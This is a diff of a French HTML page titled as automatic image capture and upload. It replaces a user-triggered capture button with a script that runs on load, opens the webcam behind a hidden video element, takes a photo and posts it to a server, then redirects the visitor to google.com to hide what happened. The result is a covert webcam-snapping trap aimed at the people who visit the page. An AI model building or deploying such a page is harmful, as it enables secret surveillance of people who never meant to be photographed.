@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture et Envoi d'Image</title>
+    <title>Capture et Envoi Automatique d'Image</title>
     <style>
         body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         #video { display: none; }
@@ -12,49 +12,50 @@
 <body>
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-    <button id="captureButton">Capturer une Image</button>
 
     <script>
-        const captureButton = document.getElementById('captureButton');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        
-        // Accéder à la caméra de l'utilisateur
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error('Erreur lors de l\'accès à la caméra:', err);
-            });
+        // Fonction pour capturer et envoyer une image
+        async function captureAndSendImage() {
+            try {
+                // Accéder à la caméra de l'utilisateur
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
 
-        // Capture d'image et envoi
-        captureButton.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const dataURL = canvas.toDataURL('image/jpeg');
-            
-            // Envoi de l'image au serveur
-            fetch('/upload-image', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: dataURL })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Réponse du serveur:', data);
+                // Afficher le flux vidéo dans l'élément vidéo
+                video.srcObject = stream;
+
+                // Attendre que le flux vidéo soit prêt
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // Capturer l'image
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg');
+
+                // Envoi de l'image au serveur
+                const response = await fetch('/upload-image', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: dataURL })
+                });
+
+                const result = await response.json();
+                console.log('Réponse du serveur:', result);
+                
                 // Redirection après l'envoi
                 window.location.href = 'https://www.google.com';
-            })
-            .catch(error => {
-                console.error('Erreur lors de l\'envoi de l\'image:', error);
+            } catch (error) {
+                console.error('Erreur lors de la capture ou de l\'envoi de l\'image:', error);
                 // Redirection en cas d'erreur
                 window.location.href = 'https://www.google.com';
-            });
-        });
+            }
+        }
+
+        // Appeler la fonction de capture d'image dès que la page est chargée
+        window.onload = captureAndSendImage;
     </script>
 </body>
 </html>
